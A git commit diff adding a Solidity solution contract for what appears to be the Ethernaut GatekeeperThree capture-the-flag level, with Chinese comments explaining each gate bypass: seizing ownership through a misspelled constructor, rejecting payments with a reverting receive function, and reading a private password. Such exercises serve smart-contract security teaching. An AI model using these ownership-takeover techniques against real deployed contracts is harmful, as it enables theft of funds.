35f4423d2f8bb002e5d298d3f2d4f024e5d23c94
rlavy0310 <57977123+rlavy0310@users.noreply.github.com>
2024-08-19 16:29:59 +0800

    Update 7.modifier-three-hack.sol

--- contracts/sol-tech/7.modifier-three-hack.sol
+++ contracts/sol-tech/7.modifier-three-hack.sol
@@ -1,2 +1,23 @@
+//gateOne: 还是通过部署合约调用，绕过检查
+//gateTwo：construct0r() 拼写错误导致的，合约调用construct0r() 就可成为owner
+//gateThree：合约可通过设置receive 添加revert()，拒绝收款，就可以通过
+//password可以通过访问私有变量就可以获取
+
+contract solution {
+    GatekeeperThree public target;
+    address public owner;
+
+    constructor(address _target) {
+      target = GatekeeperThree(payable(_target));
+      target.construct0r();
+    }
 
 
+   function solve() public returns (bool entered){
+     entered = target.enter();
+   }
+
+    receive () external payable {
+     revert(); 
+   }
+}
